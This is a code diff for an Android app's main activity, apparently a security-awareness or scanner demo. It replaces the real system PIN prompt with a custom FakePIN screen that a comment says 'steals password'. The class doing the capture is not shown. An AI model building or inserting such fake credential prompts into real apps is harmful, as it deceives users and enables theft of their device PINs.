@@ -10,6 +10,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
+import android.view.MotionEvent;
 import android.view.View;
 import android.widget.ImageView;
 import android.widget.TextView;
@@ -27,7 +28,16 @@ public class MainActivity extends AppCompatActivity {
     private static int ACTIVITY_LOCK = 4;
     private static int ACTIVITY_FIRST_LOAD = 3;
 
+    @Override
+    public boolean dispatchTouchEvent(MotionEvent e) {
+        //Log.v("secme", "Touchy");
+        return super.dispatchTouchEvent(e);
+    }
+
+    //unlock with real PIN form
     private void unlock_screen() {
+        final ImageView myLayout = findViewById(R.id.imageView);
+
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
             KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
             if (km.isKeyguardSecure()) {
@@ -35,6 +45,19 @@ public class MainActivity extends AppCompatActivity {
                 startActivityForResult(authIntent, ACTIVITY_LOCK);
             }
         }
+        try {
+            Thread.sleep(2000);
+        } catch (InterruptedException ex) {
+            ex.printStackTrace();
+        }
+        Glide.with(this).load(R.drawable.warning).into(myLayout);  //image warning
+    }
+
+    //unlock with PIN form that steals password
+    private void unlock_screen_custom() {
+        Intent i = new Intent(MainActivity.this, FakePIN.class);
+        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        startActivityForResult(i, ACTIVITY_LOCK);
     }
 
     // Demande de faux PIN
@@ -45,13 +68,8 @@ public class MainActivity extends AppCompatActivity {
         if (!authenticated)  // Demande le code PIN
         {
             //Log.v("secme", "Ask for PIN - main");
-            unlock_screen();
-            try {
-                Thread.sleep(1000);
-            } catch(InterruptedException ex) {
-                ex.printStackTrace();
-            }
-            Glide.with(this).load(R.drawable.icon).into(myLayout);  //image warning
+            //unlock_screen();
+            unlock_screen_custom();
         } else {
             if (scanning) {
                 //Log.v("secme", "Already scanning ! - main");
@@ -83,7 +101,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         ImageView imageView = findViewById(R.id.imageView);
-        Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
+        Glide.with(this).load(R.drawable.annonce_intro).into(imageView); //annonce code pin necessaire
     }
 
     // Lancement d'un scan après appui du bouton dans l'activité Analyze
@@ -92,12 +110,14 @@ public class MainActivity extends AppCompatActivity {
         super.onActivityResult(requestCode, resultCode, data);
         //Log.v("secme", "Trigger" + requestCode);
         if (requestCode == ACTIVITY_LOCK) { //4
+            final ImageView myLayout = findViewById(R.id.imageView);
+            Glide.with(this).load(R.drawable.warning).into(myLayout);  //image warning
             //Log.v("secme", "Correct PIN - main");
+            //Log.v("secme", String.valueOf(data));
             authenticated = true;
-        }
-        else if (requestCode == ACTIVITY_FIRST_LOAD) { //3
+        } else if (requestCode == ACTIVITY_FIRST_LOAD) { //3
             //Log.v("secme", "First load finished - main");
-            LOAD_TIME = 6000;
+            LOAD_TIME = 5000;
             firstLaunch(findViewById(R.id.imageView));
         }
     }
